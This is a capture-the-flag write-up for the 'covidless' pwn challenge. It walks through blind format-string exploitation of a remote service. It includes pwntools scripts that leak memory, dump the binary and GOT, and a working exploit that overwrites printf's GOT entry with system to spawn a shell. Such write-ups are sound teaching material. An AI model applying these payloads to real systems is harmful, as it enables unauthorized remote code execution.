---
title: "[pwn] covidless"
categories:
  - CTF/pwn
tags:
  - fmtstr
  - overwriteGOT
---

The only info provided was ip addr & port number. Without binary to download, then i try it, the binary has format string vuln.

```bash
$ nc covidless.insomnihack.ch 6666
%8$p
Your covid pass is invalid : 0x5379334b5f763172
try again ..

%9$p
Your covid pass is invalid : 0x5f74304e6e34635f
try again ..
```

```python
#!/usr/bin/python3
from pwn import *
context.log_level='critical'

for i in range(1, 100):
    r = remote('covidless.insomnihack.ch', '6666')

    # r.sendline(f'%{i}$s')   #1
    r.sendline(f"%{i}$016lx") #2

    data = r.recvline()[29:-1]
    if(data != b'(null)'):
        print(i, data)
    r.close()
```

with `#1` i obtain some info

```bash
59 b'./covidless'
61 b'REMOTE_HOST=::ffff:14.177.85.188'
69 b'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
73 b'LD_PRELOAD=./libc6_2.27-3ubuntu1_amd64.so'
84 b'\x7fELF\x02\x01\x01'
```

with #2 output from 2 consecutive runs, it has some same

```bash
1 b'0000000000400934'
6 b'74346e3143633456'
7 b'505f44315f6e6f31'
8 b'5379334b5f763172'
9 b'5f74304e6e34635f'
30 b'0000000000400890' <- A return address that points into
35 b'000000000040075a'    the .text segment of the program
```

We can assume that PIE is off (the `.text` segment addresses are the same each time).

The .text segment likely starts at `0x400000`

```python
# dump.py
#!/usr/bin/python3
from pwn import *

binary = b""
leak = b""
io = remote('covidless.insomnihack.ch', 6666)
addr = 0x400000 # 0x601000
while addr != 0x402000:# 0x602000
    if '0a' in hex(addr):
        leak = b"0"
        binary += b'\0'
    else:
        payload = b"%13$sAAA"+p64(addr)
        io.sendline(payload)
        io.recvuntil(b" : ")
        leak = io.recvuntil(b"AAA",drop=True)
        if leak == b"":
            leak = b"0"
            binary += b'\0'
        else:
            binary += leak
	print(hex(addr), '0x' + leak[::-1].hex())
    with open('bin','wb+') as f:
        f.write(binary)
    addr += len(leak)

$ ./dump.py > log.txt
```

look at import tab in ida, the GOT located at offset `0x601000` run it again with new addr

log.txt + [symbols on libc](https://libc.blukat.me/d/libc6_2.27-3ubuntu1_amd64.symbols) :

```bash
0x601000 0x600e20
0x601008 0x7fddfa0fe170
0x60100e 0x30
0x60100f 0x30
0x601010 0x7fddf9eea8f0
0x601016 0x30
0x601017 0x30
0x601018 0x7fddf9b629c0 -> _IO_puts
0x60101e 0x30
0x60101f 0x30
0x601020 0x4005f6
0x601028 0x7fddf9b46e80 -> _IO_printf
0x60102e 0x30
0x60102f 0x30
0x601030 0x7fddf9c70f50 -> _snprintf
0x601036 0x30
0x601037 0x30
0x601038 0x7fddf9b60b20 -> _IO_fgets, fgets
0x60103e 0x30
0x60103f 0x30
0x601040 0x7fddf9b8be70 -> __snprintf_chk
0x601046 0x30
0x601047 0x30
0x601048 0x7fddf9b607e0 -> _IO_2_1_stdin_
0x601060 0x7fddf9ece760
0x601071 0x7fddf9ecda
```

---

## Strategy

1. Leak the glibc base addr from GOT
2. Overwrite the GOT entry of `printf` with `system` using a format str
3. Get a shell

```python
# xpl.py
#!/usr/bin/env python3
from pwn import *

uu64 = lambda x : u64(x.ljust(8, b'\x00'))

def start(argv=[], *a, **kw):
    return remote('covidless.insomnihack.ch', 6666, *a, **kw)

context.clear(arch = 'amd64')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
# warning/info/debug
context.log_level = 'info'

def get_returned_value():
    data = io.recvline().replace(b"\ntry again ..\n\n", b"")[29:]
    return data

def read_address(addr):
    payload = b"%14$s".ljust(16, b",")
    payload += p64(addr)
    io.sendline(payload)

    data = get_returned_value()
    print(data)
    return data.split(b',')[0]

globalOffsetTable = {
    'puts': 0x601018,
    'printf': 0x601028,
}
io = start()

# lazy linking for puts()
io.sendline(b'')
io.recvuntil(b'\n\n')

libc.address = uu64(read_address(globalOffsetTable['puts'])) - libc.sym.puts
log.info("base = %#x", libc.address)

payload_writes = {
    globalOffsetTable['printf']: libc.sym['system']
}
io.sendline(fmtstr_payload(12, payload_writes, write_size='short'))
io.sendline(b'/bin/sh')
io.interactive()
```
